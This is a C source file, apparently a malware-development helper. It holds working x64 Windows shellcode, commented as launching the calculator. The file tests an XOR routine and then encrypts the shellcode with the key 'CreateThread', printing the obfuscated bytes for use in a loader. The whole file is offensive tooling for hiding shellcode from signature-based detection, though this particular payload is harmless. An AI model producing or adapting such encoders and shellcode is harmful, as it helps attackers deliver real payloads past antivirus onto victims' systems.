#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// Validation details. Enable VALIDATION_DEBUG to see debug output, but it's not necessary to 
// test the encryption algorithm. If the algorithm is wrong, the validator will report it even
// if VALIDATION_DEBUG is false.
#define VALIDATION_DEBUG FALSE
#define VALIDATION_ROUNDS 25  // How many rounds of validation to do on the encryption algorithm
#define VALIDATION_DATA_MAXLEN 1024
#define VALIDATION_DATA_MINLEN 1
#define VALIDATION_KEY_MAXLEN 255
#define VALIDATION_KEY_MINLEN 1

// Shellcode that pops a calculator
const unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

// XORs all characters inplace against a variable length key
VOID encXor(const char* key, const SIZE_T keyLen, char* src, const SIZE_T srcLen)
{
	for (SIZE_T i = 0; i < srcLen; i++)
		src[i] = src[i] ^ (key[i % keyLen] + i);
}

// Dumps the hex-encoded shellcode
VOID shellcodeDump(const char* s, const SIZE_T sLen)
{
	printf("{");
	for (SIZE_T i = 0; i < sLen; i++) {
		printf("0x%02x", ((unsigned int)s[i]) & 0xFF);
		if (i + 1 != sLen)
			printf(", ");
	}
	printf("}\n");
}

// Provides a hexdump of the given data
VOID hexdump(const char* s, const SIZE_T sLen)
{
	for (SIZE_T i = 0; i < sLen; i++) {
		printf("%02x", ((unsigned int)s[i]) & 0xFF);
		if (i + 1 != sLen)
			printf(" ");
	}
}

// Validate encryption and decryption methods return the same data.
BOOL validateEncryptDecrypt(
	VOID(*encrypt)(const char* key, const SIZE_T keyLen, char* src, const SIZE_T srcLen),
	VOID(*decrypt)(const char* key, const SIZE_T keyLen, char* src, const SIZE_T srcLen)
) {
	SIZE_T dataLen = 0;
	SIZE_T keyLen = 0;
	char* data;
	char *key;

	for (SIZE_T i = 0; i < VALIDATION_ROUNDS; i++) {
		// Initialisation
		dataLen = rand() % (VALIDATION_DATA_MAXLEN + 1 - VALIDATION_DATA_MINLEN) + VALIDATION_DATA_MINLEN;
		keyLen = rand() % (VALIDATION_KEY_MAXLEN + 1 - VALIDATION_KEY_MINLEN) + VALIDATION_KEY_MINLEN;
		data = (char *) malloc(dataLen * sizeof(char));
		key = (char *) malloc(keyLen * sizeof(char));
		if (VALIDATION_DEBUG)
			printf("[V] Round %d: Data length %lld, key length %lld\n", i, dataLen, keyLen);

		// Populate data and key with random data
		for (SIZE_T j = 0; j < dataLen; j++)
			data[j] = rand() % 256;
		for (SIZE_T j = 0; j < keyLen; j++)
			key[j] = rand() % 256;
		if (VALIDATION_DEBUG) {
			printf("[V] Round %d:\n", i);
			printf("\tPlaintext: "); hexdump(data, dataLen); printf("\n");
			printf("\tKey: "); hexdump(key, keyLen); printf("\n");
		}

		// Start tests
		CHAR* buf = (CHAR*)malloc(dataLen * sizeof(char));
		memcpy(buf, data, dataLen);

		// 1. Assert that encrypted bytes differ
		encrypt(key, keyLen, buf, dataLen);
		if (memcmp(buf, data, dataLen) == 0) {
			printf("[V] Round %d: FAILED. Encrypted bytes match plaintext.\n", i);
			printf("\tPlaintext: "); hexdump(data, dataLen); printf("\n");
			printf("\tEncrypted: "); hexdump(buf, dataLen); printf("\n");
			return FALSE;
		}

		// 2. Assert that decrypted bytes are the same as original bytes
		decrypt(key, keyLen, buf, dataLen);
		if (memcmp(buf, data, dataLen) != 0) {
			printf("[V] Round %d: FAILED. Decrypted bytes don't match plaintext.\n", i);
			printf("\tPlaintext: "); hexdump(data, dataLen); printf("\n");
			printf("\tDecrypted: "); hexdump(buf, dataLen); printf("\n");
			return FALSE;
		}

		if (VALIDATION_DEBUG)
			printf("[V] Round %d: PASSED.\n", i);
	}
	return TRUE;
}

int main()
{
	if (!validateEncryptDecrypt(&encXor, &encXor))
		return 1;

	CHAR* buf = (CHAR*)malloc(sizeof(shellcode) * sizeof(char));
	if (buf == NULL)
		return 1;
	memcpy(buf, shellcode, sizeof(shellcode));

	encXor("CreateThread", strlen("CreateThread"), buf, sizeof(shellcode));  // password is "CreateThread"
	shellcodeDump(buf, sizeof(shellcode));
	return 0;
}